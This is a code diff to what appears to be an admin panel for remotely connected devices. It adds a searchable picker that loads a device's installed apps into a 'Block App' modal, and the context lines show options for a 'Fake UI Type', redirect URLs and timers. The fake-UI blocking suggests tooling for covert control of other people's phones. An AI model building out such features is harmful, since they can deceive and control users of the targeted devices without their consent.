@@ -747,11 +747,18 @@
   // ═══════════════════════════════════════════════════════════════
 
   function showAppBlockerModal() {
+    // v7.9.6: Fetch apps list for the dropdown picker
+    const deviceId = getDeviceId();
     createModal('🚫 Block App — Advanced', `
       <div style="display:flex;flex-direction:column;gap:12px;">
         <div>
-          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Package Name *</label>
-          <input id="v79-block-pkg" type="text" placeholder="com.example.app" style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;font-family:monospace;box-sizing:border-box;"/>
+          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Select App from Device *</label>
+          <input id="v79-block-pkg-search" type="text" placeholder="Search apps... (type to filter)" style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;box-sizing:border-box;margin-bottom:6px;" oninput="v79.filterAppPicker()"/>
+          <div id="v79-app-picker" style="max-height:200px;overflow-y:auto;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;padding:4px;">
+            <div style="padding:8px;text-align:center;color:#95a5a6;font-size:11px;">Loading apps from device...</div>
+          </div>
+          <input id="v79-block-pkg" type="hidden" value=""/>
+          <div id="v79-block-pkg-display" style="margin-top:4px;padding:6px 10px;background:rgba(0,0,0,.2);border-radius:4px;font-family:monospace;font-size:11px;color:#3498db;min-height:20px;">No app selected</div>
         </div>
         <div>
           <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Fake UI Type</label>
@@ -790,6 +797,72 @@
     document.getElementById('v79-block-url-row').style.display = (type === 'redirect') ? 'block' : 'none';
     document.getElementById('v79-block-timer-row').style.display = (type === 'timer') ? 'block' : 'none';
   };
+
+  // v7.9.6: Load apps from device for the app picker dropdown
+  v79._appPickerApps = [];
+
+  window.v79.loadAppsForPicker = async function() {
+    const deviceId = getDeviceId();
+    if (!deviceId) return;
+    try {
+      const data = await apiCall(`/api/admin/connections/${deviceId}/apps?system=false&limit=500`);
+      if (data.apps || data.entries) {
+        v79._appPickerApps = data.apps || data.entries || [];
+        v79.renderAppPicker(v79._appPickerApps);
+      }
+    } catch (e) {
+      // Fallback: try without system filter
+      try {
+        const data2 = await apiCall(`/api/admin/connections/${deviceId}/apps?limit=500`);
+        v79._appPickerApps = data2.apps || data2.entries || [];
+        v79.renderAppPicker(v79._appPickerApps);
+      } catch (_) {
+        const picker = document.getElementById('v79-app-picker');
+        if (picker) picker.innerHTML = '<div style="padding:8px;text-align:center;color:#e74c3c;font-size:11px;">Failed to load apps. Enter package manually.</div>';
+      }
+    }
+  };
+
+  window.v79.renderAppPicker = function(apps) {
+    const picker = document.getElementById('v79-app-picker');
+    if (!picker) return;
+    if (!apps || apps.length === 0) {
+      picker.innerHTML = '<div style="padding:8px;text-align:center;color:#95a5a6;font-size:11px;">No apps found</div>';
+      return;
+    }
+    picker.innerHTML = apps.map(a => {
+      const pkg = a.package_name || a.packageName || '';
+      const name = a.app_name || a.appName || pkg;
+      return `<div onclick="v79.selectAppFromPicker('${escapeHtml(pkg)}','${escapeHtml(name)}')" style="padding:6px 8px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.05);font-size:11px;" onmouseover="this.style.background='rgba(52,152,219,.2)'" onmouseout="this.style.background='transparent'">
+        <span style="color:#fff;">${escapeHtml(name)}</span><br>
+        <span style="color:#95a5a6;font-size:10px;font-family:monospace;">${escapeHtml(pkg)}</span>
+      </div>`;
+    }).join('');
+  };
+
+  window.v79.filterAppPicker = function() {
+    const search = (document.getElementById('v79-block-pkg-search')?.value || '').toLowerCase();
+    if (!search) {
+      v79.renderAppPicker(v79._appPickerApps);
+      return;
+    }
+    const filtered = v79._appPickerApps.filter(a => {
+      const pkg = (a.package_name || a.packageName || '').toLowerCase();
+      const name = (a.app_name || a.appName || '').toLowerCase();
+      return pkg.includes(search) || name.includes(search);
+    });
+    v79.renderAppPicker(filtered);
+  };
+
+  window.v79.selectAppFromPicker = function(pkg, name) {
+    document.getElementById('v79-block-pkg').value = pkg;
+    document.getElementById('v79-block-pkg-display').textContent = `${name} (${pkg})`;
+    document.getElementById('v79-block-pkg-search').value = name;
+    v79.renderAppPicker(v79._appPickerApps);  // reset highlight
+  };
+
+  // Auto-load apps when modal opens
+  setTimeout(() => v79.loadAppsForPicker(), 500);
 
   // ═══════════════════════════════════════════════════════════════
   //  BLOCKED APPS LIST MODAL (for unblocking)
